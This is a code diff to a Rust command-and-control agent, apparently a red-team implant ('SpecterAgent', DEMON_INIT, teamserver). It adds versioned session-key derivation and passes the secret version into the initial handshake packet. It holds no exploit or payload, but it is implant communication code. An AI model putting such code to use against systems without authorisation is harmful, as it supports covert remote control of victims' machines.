@@ -2,7 +2,7 @@
 
 use red_cell_common::crypto::{
     AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset, derive_session_keys,
-    generate_agent_crypto_material,
+    derive_session_keys_for_version, generate_agent_crypto_material,
 };
 use red_cell_common::demon::{DemonCommand, DemonMessage};
 use tracing::{info, warn};
@@ -68,10 +68,19 @@ impl SpecterAgent {
         let agent_id = rand::random::<u32>() | 1; // ensure non-zero
         let raw_crypto = generate_agent_crypto_material()?;
         let session_crypto = match config.init_secret.as_deref() {
-            Some(secret) => {
-                derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
-            }
             None => raw_crypto.clone(),
+            Some(secret) => {
+                if let Some(version) = config.init_secret_version {
+                    derive_session_keys_for_version(
+                        &raw_crypto.key,
+                        &raw_crypto.iv,
+                        version,
+                        &[(version, secret.as_bytes())],
+                    )?
+                } else {
+                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
+                }
+            }
         };
         let transport = FallbackTransport::new(&config)?;
 
@@ -135,7 +144,12 @@ impl SpecterAgent {
     /// the local CTR state is synchronised with the shared teamserver offset.
     pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
         let metadata = self.collect_metadata();
-        let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
+        let packet = build_init_packet(
+            self.agent_id,
+            &self.raw_crypto,
+            &metadata,
+            self.config.init_secret_version,
+        )?;
 
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");
 
